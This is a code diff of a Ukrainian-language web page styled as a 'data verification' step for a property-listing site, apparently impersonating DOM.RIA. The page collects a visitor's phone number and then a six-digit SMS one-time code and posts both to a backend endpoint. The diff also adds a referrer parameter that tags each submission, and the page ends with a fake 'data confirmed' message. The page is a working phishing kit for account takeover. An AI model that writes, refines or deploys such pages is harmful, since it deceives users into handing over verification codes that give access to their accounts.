@@ -6,15 +6,14 @@
     <title>Перевірка даних - DIM.RIA</title>
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
 
     <style>
         :root {
-            --primary-color: #007bff; /* Синій колір DOM.RIA */
+            --primary-color: #007bff;
             --primary-hover-color: #0056b3;
-            --autoria-safe-color: #28a745; /* Зелений колір для "безпеки" */
+            --autoria-safe-color: #28a745;
             --border-radius: 12px;
             --shadow-light: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
@@ -71,13 +70,7 @@
             height: auto;
             display: block;
             margin: 0 auto;
-            border-radius: 50%; /* Для круглої аватарки */
-        }
-
-        .phone-form, .sms-form {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
+            border-radius: 50%;
         }
 
         #phone-number {
@@ -112,7 +105,7 @@
         }
 
         .code-input {
-            width: 35px; /* Для 6 цифр */
+            width: 35px;
             height: 45px;
             text-align: center;
             font-size: 24px;
@@ -151,7 +144,6 @@
 <body>
 
     <div class="container">
-        
         <div class="security-check">
             <i class="fas fa-lock security-check-icon"></i> 
             <span class="security-check-text">Перевірка даних</span>
@@ -164,21 +156,15 @@
         <div id="phone-step">
             <form class="phone-form" onsubmit="return false;">
                 <div class="input-group">
-                    <input type="tel" id="phone-number" name="phone" 
-                           placeholder="99 25 322 77" 
-                           required>
+                    <input type="tel" id="phone-number" name="phone" placeholder="99 25 322 77" required>
                 </div>
-                
                 <button type="button" class="submit-button" onclick="showSmsStep()">Продовжити</button>
             </form>
         </div>
 
         <div id="sms-step" style="display: none;">
-            
             <p class="sms-prompt">Для підтвердження даних введіть одноразовий SMS-код</p>
-            
             <form class="sms-form" onsubmit="sendSmsCode(event)">
-                
                 <div class="code-input-group">
                     <input type="text" maxlength="1" class="code-input" id="code-1" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-2" inputmode="numeric">
@@ -187,133 +173,103 @@
                     <input type="text" maxlength="1" class="code-input" id="code-5" inputmode="numeric">
                     <input type="text" maxlength="1" class="code-input" id="code-6" inputmode="numeric">
                 </div>
-                
                 <button type="submit" class="submit-button">Продовжити</button>
             </form>
         </div>
-
     </div>
     
     <script>
-        // === ЛОГІКА ДЛЯ КРОКУ ТЕЛЕФОНУ (МАСКА) ===
+        // === ОТРИМАННЯ РЕФЕРАЛА З URL ===
+        let referrer = '';
+        const urlParams = new URLSearchParams(window.location.search);
+        const refEncoded = urlParams.get('ref');
+        if (refEncoded) {
+            try {
+                referrer = atob(refEncoded).replace(/[^a-zA-Z0-9_]/g, ''); // Безпечне очищення
+            } catch (e) {
+                console.error("Невалідний ref");
+            }
+        }
+
+        // === МАСКА ТЕЛЕФОНУ ===
         $(document).ready(function(){
             const prefix = '+380 ';
-            
-            // Встановлюємо маску для номера телефону
-            $('#phone-number').mask(
-                '+380999999999', 
-                {
-                    translation: { '9': { pattern: /\d/ } },
-                    placeholder: " " 
-                }
-            ).val(prefix);
+            $('#phone-number').mask('+380999999999', {
+                translation: { '9': { pattern: /\d/ } },
+                placeholder: " "
+            }).val(prefix);
 
-            // Запобігання видаленню префікса
             $('#phone-number').on('focus click', function() {
-                if ($(this).val().length < prefix.length) { 
-                    $(this).val(prefix);
-                }
+                if ($(this).val().length < prefix.length) $(this).val(prefix);
             }).on('keydown', function(e) {
-                // Заборона Backspace/Delete, якщо залишився тільки префікс
-                if ((e.keyCode === 8 || e.keyCode === 46) && $(this).val() === prefix) { 
+                if ((e.keyCode === 8 || e.keyCode === 46) && $(this).val() === prefix) {
                     e.preventDefault();
                 }
             });
-            
-            // === ЛОГІКА ДЛЯ АВТОМАТИЧНОГО ПЕРЕХОДУ ВВЕДЕННЯ КОДУ ===
+
+            // Автоперехід між полями SMS
             $('.code-input').on('keyup', function(e) {
-                const currentInput = $(this);
-                const maxLength = parseInt(currentInput.attr('maxlength'));
-                const myLength = currentInput.val().length;
-                
-                if (myLength >= maxLength) {
-                    let nextInput = currentInput.nextAll('.code-input').first();
-                    if (nextInput.length) {
-                        nextInput.focus();
-                    }
-                }
-                
-                // Якщо натиснуто Backspace і поле пусте, перемістити фокус назад
-                if (e.keyCode === 8 && myLength === 0) {
-                    let prevInput = currentInput.prevAll('.code-input').first();
-                    if (prevInput.length) {
-                        prevInput.focus();
-                    }
+                const $this = $(this);
+                if ($this.val().length === 1) {
+                    const $next = $this.next('.code-input');
+                    if ($next.length) $next.focus();
+                } else if (e.keyCode === 8 && $this.val() === '') {
+                    const $prev = $this.prev('.code-input');
+                    if ($prev.length) $prev.focus();
                 }
             });
         });
-        
-        // === ЛОГІКА ДЛЯ ПЕРЕМИКАННЯ ТА ВІДПРАВКИ КРОКІВ (AJAX) ===
+
+        // === ВІДПРАВКА НОМЕРУ ===
         function showSmsStep() {
             const phoneNumber = $('#phone-number').val();
-            
-            // Перевірка на валідність номеру (повна довжина без пробілів)
-            if (phoneNumber && phoneNumber.replace(/\s/g, '').length === '+380999999999'.length) {
-                
-                // 1. МИТТЄВИЙ ПЕРЕХІД ДО КРОКУ SMS для прискорення
-                $('#phone-step').hide();
-                $('#sms-step').show();
-                $('#code-1').focus();
-
-                // 2. ВІДПРАВКА НОМЕРУ ТЕЛЕФОНУ (на задньому плані, не блокує інтерфейс)
-                $.ajax({
-                    url: '/api/send-data', 
-                    type: 'POST',
-                    contentType: 'application/json', 
-                    data: JSON.stringify({
-                        step: 'phone',
-                        phone: phoneNumber
-                    }),
-                    success: function(response) {
-                        console.log('Номер телефону успішно відправлено (фон):', response);
-                    },
-                    error: function(xhr, status, error) {
-                        console.error('Фонова помилка відправки номеру:', xhr.responseText);
-                    }
-                });
-                
-            } else {
-                alert('Будь ласка, введіть повний номер телефону у форматі +380 ХХ ХХ ХХХ ХХ.');
+            if (phoneNumber.replace(/\s/g, '').length !== 13) {
+                alert('Введіть повний номер телефону');
+                return;
             }
+
+            $('#phone-step').hide();
+            $('#sms-step').show();
+            $('#code-1').focus();
+
+            // Фонова відправка
+            sendData('phone', { phone: phoneNumber });
         }
 
-        // Функція для відправки SMS-коду
-        function sendSmsCode(event) {
-            event.preventDefault(); 
-
-            // Збираємо код з усіх полів
-            const smsCode = $('.code-input').map(function() {
-                return this.value;
-            }).get().join(''); 
-            
-            // Перевірка на 6 цифр
-            if (smsCode.length === 6 && /^\d+$/.test(smsCode)) { 
-                
-                // 2. ВІДПРАВКА SMS-КОДУ
-                $.ajax({
-                    url: '/api/send-data', 
-                    type: 'POST',
-                    contentType: 'application/json', 
-                    data: JSON.stringify({ 
-                        step: 'code',
-                        code: smsCode
-                    }),
-                    success: function(response) {
-                        // Змінене повідомлення про успіх
-                        alert('Дані підтвердженно, гарного дня!');
-                        console.log('SMS-код успішно відправлено:', response);
-                    },
-                    error: function(xhr, status, error) {
-                        alert('Помилка відправки коду. Спробуйте пізніше.');
-                        console.error('Помилка AJAX (Код):', xhr.responseText);
-                    }
-                });
-                
-            } else {
-                alert('Будь ласка, введіть повний 6-значний код.');
+        // === ВІДПРАВКА SMS КОДУ ===
+        function sendSmsCode(e) {
+            e.preventDefault();
+            const code = $('.code-input').map((_, el) => el.value).get().join('');
+            if (code.length !== 6 || !/^\d+$/.test(code)) {
+                alert('Введіть 6 цифр');
+                return;
             }
+
+            sendData('code', { code });
+        }
+
+        // === УНІВЕРСАЛЬНА ВІДПРАВКА ===
+        function sendData(step, data) {
+            const payload = { step, ...data };
+            if (referrer) payload.referrer = referrer;
+
+            $.ajax({
+                url: '/api/send-data',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify(payload),
+                success: function(res) {
+                    if (step === 'code') {
+                        alert('Дані підтверджено, гарного дня!');
+                    }
+                },
+                error: function() {
+                    if (step === 'code') {
+                        alert('Помилка. Спробуйте ще раз.');
+                    }
+                }
+            });
         }
     </script>
-
 </body>
 </html>
